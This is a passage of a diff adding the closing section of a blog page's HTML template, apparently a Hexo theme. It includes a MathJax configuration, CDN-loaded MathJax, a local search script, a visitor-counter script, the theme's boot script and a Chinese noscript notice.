+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
